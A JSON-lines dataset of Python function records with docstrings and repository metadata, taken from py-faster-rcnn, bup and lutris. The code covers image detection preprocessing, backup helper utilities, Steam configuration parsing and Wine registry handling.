{"docstring": "\"\"\"Generate RPN proposals on a single image.\"\"\"\n", "func_signal": "def im_proposals(net, im):\n", "code": "blobs = {}\nblobs['data'], blobs['im_info'] = _get_image_blob(im)\nnet.blobs['data'].reshape(*(blobs['data'].shape))\nnet.blobs['im_info'].reshape(*(blobs['im_info'].shape))\nblobs_out = net.forward(\n        data=blobs['data'].astype(np.float32, copy=False),\n        im_info=blobs['im_info'].astype(np.float32, copy=False))\n\nscale = blobs['im_info'][0, 2]\nboxes = blobs_out['rois'][:, 1:].copy() / scale\nscores = blobs_out['scores'].copy()\nreturn boxes, scores", "path": "py-faster-rcnn/lib/rpn/generate.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Initialize pycaffe in a training process.\n\"\"\"\n\n", "func_signal": "def _init_caffe(cfg):\n", "code": "import caffe\n# fix the random seeds (numpy and caffe) for reproducibility\nnp.random.seed(cfg.RNG_SEED)\ncaffe.set_random_seed(cfg.RNG_SEED)\n# set up caffe\ncaffe.set_mode_gpu()\ncaffe.set_device(cfg.GPU_ID)", "path": "py-faster-rcnn/tools/train_faster_rcnn_alt_opt.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Converts an image into a network input.\n\nArguments:\n    im (ndarray): a color image in BGR order\n\nReturns:\n    blob (ndarray): a data blob holding an image pyramid\n    im_scale_factors (list): list of image scales (relative to im) used\n        in the image pyramid\n\"\"\"\n", "func_signal": "def _get_image_blob(im):\n", "code": "im_orig = im.astype(np.float32, copy=True)\nim_orig -= cfg.PIXEL_MEANS\n\nim_shape = im_orig.shape\nim_size_min = np.min(im_shape[0:2])\nim_size_max = np.max(im_shape[0:2])\n\nprocessed_ims = []\n\nassert len(cfg.TEST.SCALES) == 1\ntarget_size = cfg.TEST.SCALES[0]\n\nim_scale = float(target_size) / float(im_size_min)\n# Prevent the biggest axis from being more than MAX_SIZE\nif np.round(im_scale * im_size_max) > cfg.TEST.MAX_SIZE:\n    im_scale = float(cfg.TEST.MAX_SIZE) / float(im_size_max)\nim = cv2.resize(im_orig, None, None, fx=im_scale, fy=im_scale,\n                interpolation=cv2.INTER_LINEAR)\nim_info = np.hstack((im.shape[:2], im_scale))[np.newaxis, :]\nprocessed_ims.append(im)\n\n# Create a blob to hold the input images\nblob = im_list_to_blob(processed_ims)\n\nreturn blob, im_info", "path": "py-faster-rcnn/lib/rpn/generate.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"\nLoad image ids.\n\"\"\"\n", "func_signal": "def _load_image_set_index(self):\n", "code": "image_ids = self._COCO.getImgIds()\nreturn image_ids", "path": "py-faster-rcnn/lib/datasets/coco.py", "commit_date": "2016-02-24 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Return the blobs to be used for the next minibatch.\n\nIf cfg.TRAIN.USE_PREFETCH is True, then blobs will be computed in a\nseparate process and made available through self._blob_queue.\n\"\"\"\n", "func_signal": "def _get_next_minibatch(self):\n", "code": "if cfg.TRAIN.USE_PREFETCH:\n    return self._blob_queue.get()\nelse:\n    db_inds = self._get_next_minibatch_inds()\n    minibatch_db = [self._roidb[i] for i in db_inds]\n    return get_minibatch(minibatch_db, self._num_classes)", "path": "py-faster-rcnn/lib/roi_data_layer/layer.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Get blobs and copy them into this layer's top blob vector.\"\"\"\n", "func_signal": "def forward(self, bottom, top):\n", "code": "blobs = self._get_next_minibatch()\n\nfor blob_name, blob in blobs.iteritems():\n    top_ind = self._name_to_top_map[blob_name]\n    # Reshape net's input blobs\n    top[top_ind].reshape(*(blob.shape))\n    # Copy data into net's input blobs\n    top[top_ind].data[...] = blob.astype(np.float32, copy=False)", "path": "py-faster-rcnn/lib/roi_data_layer/layer.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Draw detected bounding boxes.\"\"\"\n", "func_signal": "def _vis_proposals(im, dets, thresh=0.5):\n", "code": "inds = np.where(dets[:, -1] >= thresh)[0]\nif len(inds) == 0:\n    return\n\nclass_name = 'obj'\nim = im[:, :, (2, 1, 0)]\nfig, ax = plt.subplots(figsize=(12, 12))\nax.imshow(im, aspect='equal')\nfor i in inds:\n    bbox = dets[i, :4]\n    score = dets[i, -1]\n\n    ax.add_patch(\n        plt.Rectangle((bbox[0], bbox[1]),\n                      bbox[2] - bbox[0],\n                      bbox[3] - bbox[1], fill=False,\n                      edgecolor='red', linewidth=3.5)\n        )\n    ax.text(bbox[0], bbox[1] - 2,\n            '{:s} {:.3f}'.format(class_name, score),\n            bbox=dict(facecolor='blue', alpha=0.5),\n            fontsize=14, color='white')\n\nax.set_title(('{} detections with '\n              'p({} | box) >= {:.1f}').format(class_name, class_name,\n                                              thresh),\n              fontsize=14)\nplt.axis('off')\nplt.tight_layout()\nplt.draw()", "path": "py-faster-rcnn/lib/rpn/generate.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"\nParse input arguments\n\"\"\"\n", "func_signal": "def parse_args():\n", "code": "parser = argparse.ArgumentParser(description='Test a Fast R-CNN network')\nparser.add_argument('--imdb', dest='imdb_name',\n                    help='dataset to test',\n                    default='voc_2007_test', type=str)\nparser.add_argument('--method', dest='method',\n                    help='proposal method',\n                    default='selective_search', type=str)\nparser.add_argument('--rpn-file', dest='rpn_file',\n                    default=None, type=str)\n\nif len(sys.argv) == 1:\n    parser.print_help()\n    sys.exit(1)\n\nargs = parser.parse_args()\nreturn args", "path": "py-faster-rcnn/tools/eval_recall.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"\nConstruct an image path from the image's \"index\" identifier.\n\"\"\"\n# Example image path for index=119993:\n#   images/train2014/COCO_train2014_000000119993.jpg\n", "func_signal": "def image_path_from_index(self, index):\n", "code": "file_name = ('COCO_' + self._data_name + '_' +\n             str(index).zfill(12) + '.jpg')\nimage_path = osp.join(self._data_path, 'images',\n                      self._data_name, file_name)\nassert osp.exists(image_path), \\\n        'Path does not exist: {}'.format(image_path)\nreturn image_path", "path": "py-faster-rcnn/lib/datasets/coco.py", "commit_date": "2016-02-24 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Randomly permute the training roidb.\"\"\"\n", "func_signal": "def _shuffle_roidb_inds(self):\n", "code": "if cfg.TRAIN.ASPECT_GROUPING:\n    widths = np.array([r['width'] for r in self._roidb])\n    heights = np.array([r['height'] for r in self._roidb])\n    horz = (widths >= heights)\n    vert = np.logical_not(horz)\n    horz_inds = np.where(horz)[0]\n    vert_inds = np.where(vert)[0]\n    inds = np.hstack((\n        np.random.permutation(horz_inds),\n        np.random.permutation(vert_inds)))\n    inds = np.reshape(inds, (-1, 2))\n    row_perm = np.random.permutation(np.arange(inds.shape[0]))\n    inds = np.reshape(inds[row_perm, :], (-1,))\n    self._perm = inds\nelse:\n    self._perm = np.random.permutation(np.arange(len(self._roidb)))\nself._cur = 0", "path": "py-faster-rcnn/lib/roi_data_layer/layer.py", "commit_date": "2015-10-05 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "# Faster R-CNN Alternating Optimization\n", "func_signal": "def get_solvers(net_name):\n", "code": "n = 'faster_rcnn_alt_opt'\n# Solver for each training stage\nsolvers = [[net_name, n, 'stage1_rpn_solver60k80k.pt'],\n           [net_name, n, 'stage1_fast_rcnn_solver30k40k.pt'],\n           [net_name, n, 'stage2_rpn_solver60k80k.pt'],\n           [net_name, n, 'stage2_fast_rcnn_solver30k40k.pt']]\nsolvers = [os.path.join(cfg.MODELS_DIR, *s) for s in solvers]\n# Iterations for each training stage\nmax_iters = [80000, 40000, 80000, 40000]\n# max_iters = [100, 100, 100, 100]\n# Test prototxt for the RPN\nrpn_test_prototxt = os.path.join(\n    cfg.MODELS_DIR, net_name, n, 'rpn_test.pt')\nreturn solvers, max_iters, rpn_test_prototxt", "path": "py-faster-rcnn/tools/train_faster_rcnn_alt_opt.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "rbgirshick/py-faster-rcnn", "stars": 8025, "license": "other", "language": "python", "size": 1393}
{"docstring": "\"\"\"Traverse the options and extract all excludes, or call Option.fatal().\"\"\"\n", "func_signal": "def parse_excludes(options, fatal):\n", "code": "excluded_paths = []\n\nfor flag in options:\n    (option, parameter) = flag\n    if option == '--exclude':\n        excluded_paths.append(resolve_parent(argv_bytes(parameter)))\n    elif option == '--exclude-from':\n        try:\n            f = open(resolve_parent(argv_bytes(parameter)), 'rb')\n        except IOError as e:\n            raise fatal(\"couldn't read %r\" % parameter)\n        for exclude_path in f.readlines():\n            # FIXME: perhaps this should be rstrip('\\n')\n            exclude_path = resolve_parent(exclude_path.strip())\n            if exclude_path:\n                excluded_paths.append(exclude_path)\nreturn sorted(frozenset(excluded_paths))", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "# Makes 'foo' exist\n", "func_signal": "def test_index_negative_timestamps(tmpdir):\n", "code": "foopath = tmpdir + b'/foo'\nf = open(foopath, 'wb')\nf.close()\n\n# Dec 31, 1969\nos.utime(foopath, (-86400, -86400))\nns_per_sec = 10**9\ntmax = (time.time() - 1) * ns_per_sec\ne = index.BlankNewEntry(foopath, 0, tmax)\ne.update_from_stat(xstat.stat(foopath), 0)\nWVPASS(e.packed())\n\n# Jun 10, 1893\nos.utime(foopath, (-0x80000000, -0x80000000))\ne = index.BlankNewEntry(foopath, 0, tmax)\ne.update_from_stat(xstat.stat(foopath), 0)\nWVPASS(e.packed())", "path": "bup/test/int/test_index.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Create a read-write memory mapped region on file 'f'.\nIf sz is 0, the region will cover the entire file.\n\"\"\"\n", "func_signal": "def mmap_readwrite(f, sz = 0, close=True):\n", "code": "return _mmap_do(f, sz, mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE,\n                close)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Return (value, was_cached).  If there is a value in the cache\nfor key, use that, otherwise, call get_value(key) which should\nthrow a KeyError if there is no value -- in which case the cached\nand returned value will be None.\n\"\"\"\n", "func_signal": "def cache_key_value(get_value, key, cache):\n", "code": "try: # Do we already have it (or know there wasn't one)?\n    value = cache[key]\n    return value, True\nexcept KeyError:\n    pass\nvalue = None\ntry:\n    cache[key] = value = get_value(key)\nexcept KeyError:\n    cache[key] = None\nreturn value, False", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "# This does not appear to be documented, but is in the\n# example, and sets the final report header line (at least)\n# for failures.\n", "func_signal": "def reportinfo(self):\n", "code": "test_name = str(self.fspath)\nlinenum = None\nreturn self.fspath, linenum, test_name", "path": "bup/test/ext/conftest.py", "commit_date": "2020-11-26 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Parse string or bytes as a possibly unit suffixed number.\n\nFor example:\n    199.2k means 203981 bytes\n    1GB means 1073741824 bytes\n    2.1 tb means 2199023255552 bytes\n\"\"\"\n", "func_signal": "def parse_num(s):\n", "code": "if isinstance(s, bytes):\n    # FIXME: should this raise a ValueError for UnicodeDecodeError\n    # (perhaps with the latter as the context).\n    s = s.decode('ascii')\ng = re.match(r'([-+\\d.e]+)\\s*(\\w*)', str(s))\nif not g:\n    raise ValueError(\"can't parse %r as a number\" % s)\n(val, unit) = g.groups()\nnum = float(val)\nunit = unit.lower()\nif unit in ['t', 'tb']:\n    mult = 1024*1024*1024*1024\nelif unit in ['g', 'gb']:\n    mult = 1024*1024*1024\nelif unit in ['m', 'mb']:\n    mult = 1024*1024\nelif unit in ['k', 'kb']:\n    mult = 1024\nelif unit in ['', 'b']:\n    mult = 1\nelse:\n    raise ValueError(\"invalid unit %r in number %r\" % (unit, s))\nreturn int(num*mult)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Return the local offset from UTC as \"+hhmm\" or \"-hhmm\" for time t.\nIf the current UTC offset does not represent an integer number\nof minutes, the fractional component will be truncated.\"\"\"\n", "func_signal": "def utc_offset_str(t):\n", "code": "off = localtime(t).tm_gmtoff\n# Note: // doesn't truncate like C for negative values, it rounds down.\noffmin = abs(off) // 60\nm = offmin % 60\nh = (offmin - m) // 60\nreturn b'%+03d%02d' % (-h if off < 0 else h, m)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Append an error message to the list of saved errors.\n\nOnce processing is able to stop and output the errors, the saved errors are\naccessible in the module variable helpers.saved_errors.\n\"\"\"\n", "func_signal": "def add_error(e):\n", "code": "saved_errors.append(e)\nlog('%-70s\\n' % e)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Return the absolute path of a file without following any final symlink.\n\nBehaves like os.path.realpath, but doesn't follow a symlink for the last\nelement. (ie. if 'p' itself is a symlink, this one won't follow it, but it\nwill follow symlinks in p's directory)\n\"\"\"\n", "func_signal": "def resolve_parent(p):\n", "code": "try:\n    st = os.lstat(p)\nexcept OSError:\n    st = None\nif st and stat.S_ISLNK(st.st_mode):\n    (dir, name) = os.path.split(p)\n    dir = os.path.realpath(dir)\n    out = os.path.join(dir, name)\nelse:\n    out = os.path.realpath(p)\n#log('realpathing:%r,%r\\n' % (p, out))\nreturn out", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Create a read-write memory mapped region on file 'f'.\nIf sz is 0, the region will cover the entire file.\nThe map is private, which means the changes are never flushed back to the\nfile.\n\"\"\"\n", "func_signal": "def mmap_readwrite_private(f, sz = 0, close=True):\n", "code": "return _mmap_do(f, sz, mmap.MAP_PRIVATE, mmap.PROT_READ|mmap.PROT_WRITE,\n                close)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Generate a list of input lines from 'f' without terminating newlines.\"\"\"\n", "func_signal": "def linereader(f):\n", "code": "while 1:\n    line = f.readline()\n    if not line:\n        break\n    yield line[:-1]", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Traverse the options and extract all rx excludes, or call\nOption.fatal().\"\"\"\n", "func_signal": "def parse_rx_excludes(options, fatal):\n", "code": "excluded_patterns = []\n\nfor flag in options:\n    (option, parameter) = flag\n    if option == '--exclude-rx':\n        try:\n            excluded_patterns.append(re.compile(argv_bytes(parameter)))\n        except re.error as ex:\n            fatal('invalid --exclude-rx pattern (%r): %s' % (parameter, ex))\n    elif option == '--exclude-rx-from':\n        try:\n            f = open(resolve_parent(parameter), 'rb')\n        except IOError as e:\n            raise fatal(\"couldn't read %r\" % parameter)\n        for pattern in f.readlines():\n            spattern = pattern.rstrip(b'\\n')\n            if not spattern:\n                continue\n            try:\n                excluded_patterns.append(re.compile(spattern))\n            except re.error as ex:\n                fatal('invalid --exclude-rx pattern (%r): %s' % (spattern, ex))\nreturn excluded_patterns", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Recursively create directories on path 'd'.\n\nUnlike os.makedirs(), it doesn't raise an exception if the last element of\nthe path already exists.\n\"\"\"\n", "func_signal": "def mkdirp(d, mode=None):\n", "code": "try:\n    if mode:\n        os.makedirs(d, mode)\n    else:\n        os.makedirs(d)\nexcept OSError as e:\n    if e.errno == errno.EEXIST:\n        pass\n    else:\n        raise", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Returns (leading_matches_it, rest_it), where leading_matches_it\nmust be completely exhausted before traversing rest_it.\n\n\"\"\"\n", "func_signal": "def partition(predicate, stream):\n", "code": "stream = iter(stream)\nns = Nonlocal()\nns.first_nonmatch = None\ndef leading_matches():\n    for x in stream:\n        if predicate(x):\n            yield x\n        else:\n            ns.first_nonmatch = (x,)\n            break\ndef rest():\n    if ns.first_nonmatch:\n        yield ns.first_nonmatch[0]\n        for x in stream:\n            yield x\nreturn (leading_matches(), rest())", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Replace the default exception handler for KeyboardInterrupt (Ctrl-C).\n\nThe new exception handler will make sure that bup will exit without an ugly\nstacktrace when Ctrl-C is hit.\n\"\"\"\n", "func_signal": "def handle_ctrl_c():\n", "code": "oldhook = sys.excepthook\ndef newhook(exctype, value, traceback):\n    if exctype == KeyboardInterrupt:\n        log('\\nInterrupted.\\n')\n    else:\n        return oldhook(exctype, value, traceback)\nsys.excepthook = newhook", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Get the FQDN of this machine.\"\"\"\n", "func_signal": "def hostname():\n", "code": "global _hostname\nif not _hostname:\n    _hostname = _helpers.gethostname()\nreturn _hostname", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Yield a file that will be atomically renamed name when leaving the block.\n\nThis contextmanager yields an open file object that is backed by a\ntemporary file which will be renamed (atomically) to the target\nname if everything succeeds.\n\nThe mode and buffering arguments are handled exactly as with open,\nand the yielded file will have very restrictive permissions, as\nper mkstemp.\n\nE.g.::\n\n    with atomically_replaced_file('foo.txt', 'w') as f:\n        f.write('hello jack.')\n\n\"\"\"\n\n", "func_signal": "def atomically_replaced_file(name, mode='w', buffering=-1):\n", "code": "(ffd, tempname) = tempfile.mkstemp(dir=os.path.dirname(name),\n                                   text=('b' not in mode))\ntry:\n    try:\n        f = os.fdopen(ffd, mode, buffering)\n    except:\n        os.close(ffd)\n        raise\n    try:\n        yield f\n    finally:\n        f.close()\n    os.rename(tempname, name)\nfinally:\n    unlink(tempname)  # nonexistant file is ignored", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"If args is not empty, yield the output produced by calling the\ncommand list with args as a sequence of strings (It may be necessary\nto return multiple strings in order to respect ARG_MAX).\"\"\"\n# The optional arg_max arg is a workaround for an issue with the\n# current wvtest behavior.\n", "func_signal": "def batchpipe(command, args, preexec_fn=None, arg_max=sc_arg_max):\n", "code": "base_size = _argmax_base(command)\nwhile args:\n    room = arg_max - base_size\n    i = 0\n    while i < len(args):\n        next_size = _argmax_args_size(args[i:i+1])\n        if room - next_size < 0:\n            break\n        room -= next_size\n        i += 1\n    sub_args = args[:i]\n    args = args[i:]\n    assert(len(sub_args))\n    yield readpipe(command + sub_args, preexec_fn=preexec_fn)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Read 'size' bytes from input stream.\"\"\"\n", "func_signal": "def read(self, size):\n", "code": "self.outp.flush()\nreturn self._read(size)", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Append \"/\" to 's' if it doesn't aleady end in \"/\".\"\"\"\n", "func_signal": "def slashappend(s):\n", "code": "assert isinstance(s, bytes)\nif s and not s.endswith(b'/'):\n    return s + b'/'\nelse:\n    return s", "path": "bup/lib/bup/helpers.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "bup/bup", "stars": 7056, "license": "other", "language": "python", "size": 6164}
{"docstring": "\"\"\"Register the lutris: protocol to open with the application.\"\"\"\n", "func_signal": "def register_url_handler():\n", "code": "executable = os.path.abspath(sys.argv[0])\nbase_key = \"desktop.gnome.url-handlers.lutris\"\nschema_directory = \"/usr/share/glib-2.0/schemas/\"\nschema_source = Gio.SettingsSchemaSource.new_from_directory(schema_directory, None, True)\nschema = schema_source.lookup(base_key, True)\nif schema:\n    settings = Gio.Settings.new(base_key)\n    settings.set_string(\"command\", executable)\nelse:\n    logger.warning(\"Schema not installed, cannot register url-handler\")", "path": "lutris/lutris/util/urlhandler.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Fetch a value from a configuration in a case insensitive way\"\"\"\n", "func_signal": "def get_config_value(config, key):\n", "code": "keymap = {k.lower(): k for k in config.keys()}\nif key not in keymap:\n    logger.warning(\n        \"Config key %s not found in %s\", key, \", \".join(list(config.keys()))\n    )\n    return\nreturn config[keymap[key.lower()]]", "path": "lutris/lutris/util/steam/config.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return pids of child processes opened by thread `tid` of process.\"\"\"\n", "func_signal": "def get_children_pids_of_thread(self, tid):\n", "code": "children_path = \"/proc/{}/task/{}/children\".format(self.pid, tid)\ntry:\n    with open(children_path) as children_file:\n        children_content = children_file.read()\nexcept (FileNotFoundError, ProcessLookupError):\n    children_content = \"\"\nreturn children_content.strip().split()", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Remove some subkeys from a key\"\"\"\n", "func_signal": "def clear_subkeys(self, path, keys):\n", "code": "key = self.keys.get(path)\nif not key:\n    return\nfor subkey in list(key.subkeys.keys()):\n    if subkey not in keys:\n        continue\n    key.subkeys.pop(subkey)", "path": "lutris/lutris/util/wine/registry.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Read the Steam configuration and return it as an object\"\"\"\n\n", "func_signal": "def read_config(steam_data_dir):\n", "code": "def get_entry_case_insensitive(config_dict, path):\n    for key, _value in config_dict.items():\n        if key.lower() == path[0].lower():\n            if len(path) <= 1:\n                return config_dict[key]\n\n            return get_entry_case_insensitive(config_dict[key], path[1:])\n    raise KeyError(path[0])\nif not steam_data_dir:\n    return None\nconfig_filename = os.path.join(steam_data_dir, \"config/config.vdf\")\nif not system.path_exists(config_filename):\n    return None\nwith open(config_filename, \"r\") as steam_config_file:\n    config = vdf_parse(steam_config_file, {})\ntry:\n    return get_entry_case_insensitive(config, [\"InstallConfigStore\", \"Software\", \"Valve\", \"Steam\"])\nexcept KeyError as ex:\n    logger.error(\"Steam config %s is empty: %s\", config_filename, ex)", "path": "lutris/lutris/util/steam/config.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return the list of games owned by a SteamID\"\"\"\n", "func_signal": "def get_steam_library(steamid):\n", "code": "if not steamid:\n    raise ValueError(\"Missing SteamID\")\nsteam_games_url = (\n    \"https://api.steampowered.com/\"\n    \"IPlayerService/GetOwnedGames/v0001/\"\n    \"?key={}&steamid={}&format=json&include_appinfo=1\"\n    \"&include_played_free_games=1\".format(\n        settings.DEFAULT_STEAM_API_ID, steamid\n    )\n)\nresponse = requests.get(steam_games_url)\nif response.status_code > 400:\n    logger.error(\"Invalid response from steam: %s\", response)\n    return []\njson_data = response.json()\nresponse = json_data['response']\nif not response:\n    logger.info(\"No games in response of %s\", steam_games_url)\n    return []\nif 'games' in response:\n    return response['games']\nif 'game_count' in response and response['game_count'] == 0:\n    return []\nlogger.error(\"Weird response: %s\", json_data)\nreturn []", "path": "lutris/lutris/util/steam/config.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return an array of the unprocessed contents of a registry file\"\"\"\n", "func_signal": "def get_raw_registry(reg_filename):\n", "code": "if not system.path_exists(reg_filename):\n    return []\nwith open(reg_filename, \"r\") as reg_file:\n\n    try:\n        registry_content = reg_file.readlines()\n    except Exception:  # pylint: disable=broad-except\n        logger.exception(\n            \"Failed to registry read %s, please send attach this file in a bug report\",\n            reg_filename,\n        )\n        registry_content = []\nreturn registry_content", "path": "lutris/lutris/util/wine/registry.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return the content of the key in the wine .reg format\"\"\"\n", "func_signal": "def render(self):\n", "code": "content = self.raw_name + \" \" + self.raw_timestamp + \"\\n\"\nfor key, value in self.metas.items():\n    if value is None:\n        content += \"#{}\\n\".format(key)\n    else:\n        content += \"#{}={}\\n\".format(key, value)\nfor key, value in self.subkeys.items():\n    if key == \"default\":\n        key = \"@\"\n    else:\n        key = '\"{}\"'.format(key)\n    content += \"{}={}\\n\".format(key, value)\nreturn content", "path": "lutris/lutris/util/wine/registry.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Filename of the executable.\"\"\"\n", "func_signal": "def name(self):\n", "code": "_stat = self.get_stat(parsed=False)\nif _stat:\n    return _stat[_stat.find(\"(\") + 1:_stat.rfind(\")\")]\nreturn None", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return the child processes of this process\"\"\"\n", "func_signal": "def children(self):\n", "code": "_children = []\nfor tid in self.get_thread_ids():\n    for child_pid in self.get_children_pids_of_thread(tid):\n        _children.append(Process(child_pid))\nreturn _children", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Write the registry to a file\"\"\"\n", "func_signal": "def save(self, path=None):\n", "code": "if not path:\n    path = self.reg_filename\nif not path:\n    raise OSError(\"No filename provided\")\nprefix_path = os.path.dirname(path)\nif not os.path.isdir(prefix_path):\n    raise OSError(\n        \"Invalid Wine prefix path %s, make sure to \"\n        \"create the prefix before saving to a registry\" % prefix_path\n    )\nwith open(path, \"w\") as registry_file:\n    registry_file.write(self.render())", "path": "lutris/lutris/util/wine/registry.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return current working dir of process\"\"\"\n", "func_signal": "def cwd(self):\n", "code": "cwd_path = \"/proc/%d/cwd\" % int(self.pid)\nreturn os.readlink(cwd_path)", "path": "lutris/lutris/util/process.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
{"docstring": "\"\"\"Return a default configuration usable to\ncreate a runnable game in Steam\"\"\"\n\n", "func_signal": "def get_default_acf(appid, name):\n", "code": "userconfig = OrderedDict()\nuserconfig[\"name\"] = name\nuserconfig[\"gameid\"] = appid\n\nappstate = OrderedDict()\nappstate[\"appID\"] = appid\nappstate[\"Universe\"] = \"1\"\nappstate[\"StateFlags\"] = \"1026\"\nappstate[\"installdir\"] = name\nappstate[\"UserConfig\"] = userconfig\nreturn {\"AppState\": appstate}", "path": "lutris/lutris/util/steam/config.py", "commit_date": "2020-11-03 00:00:00", "repo_name": "lutris/lutris", "stars": 7273, "license": "gpl-3.0", "language": "python", "size": 20560}
